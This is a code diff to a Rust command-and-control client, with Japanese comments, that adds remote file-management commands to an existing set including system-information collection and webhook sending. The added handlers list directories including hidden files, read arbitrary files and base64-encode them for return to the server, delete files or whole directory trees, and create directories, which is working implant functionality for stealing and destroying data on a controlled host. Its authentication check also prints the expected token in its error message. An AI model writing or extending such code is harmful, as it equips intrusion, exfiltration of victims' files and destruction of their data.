@@ -170,11 +170,9 @@ impl C2Client {
         Ok(commands)
     }
 
-    /// コマンドを実行
     async fn execute_command(&mut self, command: ServerCommand) -> Result<CommandResponse, String> {
         let start_time = std::time::Instant::now();
         
-        // 認証チェック
         if command.auth_token != self.config.command_auth_token {
             return Err(format!("Authentication failed: expected '{}', got '{}'", 
                 self.config.command_auth_token, command.auth_token));
@@ -184,14 +182,17 @@ impl C2Client {
 
         let ctype = command.command_type.to_lowercase();
         let result = match ctype.as_str() {
-            // コアコマンドのみ（シンプル化）
-            "collect_system_info" | "collectsysteminfo" | "collect_system_info" =>
-                self.handle_collect_system_info_command().await,
+            "collect_system_info" | "collectsysteminfo" => self.handle_collect_system_info_command().await,
             "status" => self.handle_status_command().await,
             "ping" => self.handle_ping_command().await,
             "shutdown" => self.handle_shutdown_command().await,
             "webhook_send" => self.handle_webhook_send().await,
-            // Webhook制御は必要ならここに再追加
+            // ファイル管理コマンド
+            "list_files" | "ls" => self.handle_list_files_command(&command.parameters).await,
+            "get_file_info" | "fileinfo" => self.handle_get_file_info_command(&command.parameters).await,
+            "download_file" | "download" => self.handle_download_file_command(&command.parameters).await,
+            "delete_file" | "rm" => self.handle_delete_file_command(&command.parameters).await,
+            "create_dir" | "mkdir" => self.handle_create_dir_command(&command.parameters).await,
             _ => Err(format!("Unknown command type: {}", command.command_type)),
         };
 
@@ -390,6 +391,195 @@ impl C2Client {
         {
             // Unix系の場合は簡略化（実装可能だが複雑）
             None
+        }
+    }
+
+    // ========== ファイル管理コマンド ==========
+
+    /// ディレクトリ一覧取得
+    async fn handle_list_files_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        let path = params.get(0).map(|s| s.as_str()).unwrap_or(".");
+        let show_hidden = params.get(1).map(|s| s == "true").unwrap_or(false);
+        
+        match std::fs::read_dir(path) {
+            Ok(entries) => {
+                let mut files = Vec::new();
+                for entry in entries {
+                    if let Ok(entry) = entry {
+                        let metadata = entry.metadata().ok();
+                        let name = entry.file_name().to_string_lossy().to_string();
+                        
+                        // 隠しファイルのフィルタリング
+                        if !show_hidden && (name.starts_with('.') || name.starts_with('~')) {
+                            continue;
+                        }
+                        
+                        let file_info = serde_json::json!({
+                            "name": name,
+                            "path": entry.path().to_string_lossy(),
+                            "is_dir": metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false),
+                            "is_file": metadata.as_ref().map(|m| m.is_file()).unwrap_or(false),
+                            "size": metadata.as_ref().map(|m| m.len()).unwrap_or(0),
+                            "modified": metadata.as_ref().and_then(|m| 
+                                m.modified().ok().and_then(|t| 
+                                    t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs()))),
+                        });
+                        
+                        files.push(file_info);
+                    }
+                }
+                
+                // ディレクトリ優先でソート
+                files.sort_by(|a, b| {
+                    let a_is_dir = a.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);
+                    let b_is_dir = b.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);
+                    
+                    match (a_is_dir, b_is_dir) {
+                        (true, false) => std::cmp::Ordering::Less,
+                        (false, true) => std::cmp::Ordering::Greater,
+                        _ => a.get("name").and_then(|v| v.as_str())
+                            .cmp(&b.get("name").and_then(|v| v.as_str())),
+                    }
+                });
+                
+                let result = serde_json::json!({
+                    "path": path,
+                    "files": files,
+                    "count": files.len(),
+                    "show_hidden": show_hidden
+                });
+                
+                Ok((format!("Listed {} files in '{}'", files.len(), path), Some(result)))
+            },
+            Err(e) => Err(format!("Failed to list directory '{}': {}", path, e))
+        }
+    }
+
+    /// ファイル情報取得
+    async fn handle_get_file_info_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        let file_path = params.get(0).ok_or("File path parameter required")?;
+        
+        match std::fs::metadata(file_path) {
+            Ok(metadata) => {
+                let file_info = serde_json::json!({
+                    "path": file_path,
+                    "name": std::path::Path::new(file_path).file_name()
+                        .and_then(|n| n.to_str()).unwrap_or("unknown"),
+                    "is_dir": metadata.is_dir(),
+                    "is_file": metadata.is_file(),
+                    "size": metadata.len(),
+                    "readonly": metadata.permissions().readonly(),
+                    "created": metadata.created().ok().and_then(|t| 
+                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
+                    "modified": metadata.modified().ok().and_then(|t| 
+                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
+                    "accessed": metadata.accessed().ok().and_then(|t| 
+                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
+                });
+                
+                Ok((format!("File info for '{}'", file_path), Some(file_info)))
+            },
+            Err(e) => Err(format!("Failed to get file info for '{}': {}", file_path, e))
+        }
+    }
+
+    /// ファイルダウンロード（サーバーに送信）
+    async fn handle_download_file_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        let file_path = params.get(0).ok_or("File path parameter required")?;
+        let max_size = params.get(1)
+            .and_then(|s| s.parse::<u64>().ok())
+            .unwrap_or(10 * 1024 * 1024); // デフォルト10MB制限
+        
+        // ファイルサイズ確認
+        let metadata = std::fs::metadata(file_path)
+            .map_err(|e| format!("File '{}' not found: {}", file_path, e))?;
+        
+        if metadata.len() > max_size {
+            return Err(format!("File too large: {} bytes (max: {} bytes)", 
+                metadata.len(), max_size));
+        }
+        
+        if metadata.is_dir() {
+            return Err(format!("'{}' is a directory, not a file", file_path));
+        }
+        
+        match std::fs::read(file_path) {
+            Ok(file_data) => {
+                // Base64エンコード
+                use base64::{Engine as _, engine::general_purpose};
+                let encoded_data = general_purpose::STANDARD.encode(&file_data);
+                
+                let file_info = serde_json::json!({
+                    "file_path": file_path,
+                    "file_name": std::path::Path::new(file_path).file_name()
+                        .and_then(|n| n.to_str()).unwrap_or("unknown"),
+                    "size": file_data.len(),
+                    "data": encoded_data,
+                    "encoding": "base64",
+                    "content_type": "application/octet-stream"
+                });
+                
+                Ok((format!("File '{}' downloaded ({} bytes)", file_path, file_data.len()), Some(file_info)))
+            },
+            Err(e) => Err(format!("Failed to read file '{}': {}", file_path, e))
+        }
+    }
+
+    /// ファイル削除
+    async fn handle_delete_file_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        let file_path = params.get(0).ok_or("File path parameter required")?;
+        let force = params.get(1).map(|s| s == "true").unwrap_or(false);
+        
+        let metadata = std::fs::metadata(file_path)
+            .map_err(|e| format!("File '{}' not found: {}", file_path, e))?;
+        
+        let result = if metadata.is_dir() {
+            if force {
+                std::fs::remove_dir_all(file_path)
+            } else {
+                std::fs::remove_dir(file_path)
+            }
+        } else {
+            std::fs::remove_file(file_path)
+        };
+        
+        match result {
+            Ok(()) => {
+                let info = serde_json::json!({
+                    "path": file_path,
+                    "type": if metadata.is_dir() { "directory" } else { "file" },
+                    "status": "deleted",
+                    "force": force
+                });
+                Ok((format!("Deleted {} '{}'", 
+                    if metadata.is_dir() { "directory" } else { "file" }, 
+                    file_path), Some(info)))
+            },
+            Err(e) => Err(format!("Failed to delete '{}': {}", file_path, e))
+        }
+    }
+
+    /// ディレクトリ作成
+    async fn handle_create_dir_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        let dir_path = params.get(0).ok_or("Directory path parameter required")?;
+        let recursive = params.get(1).map(|s| s == "true").unwrap_or(false);
+        
+        let result = if recursive {
+            std::fs::create_dir_all(dir_path)
+        } else {
+            std::fs::create_dir(dir_path)
+        };
+        
+        match result {
+            Ok(()) => {
+                let info = serde_json::json!({
+                    "path": dir_path,
+                    "recursive": recursive,
+                    "status": "created"
+                });
+                Ok((format!("Directory created: '{}'", dir_path), Some(info)))
+            },
+            Err(e) => Err(format!("Failed to create directory '{}': {}", dir_path, e))
         }
     }
 }
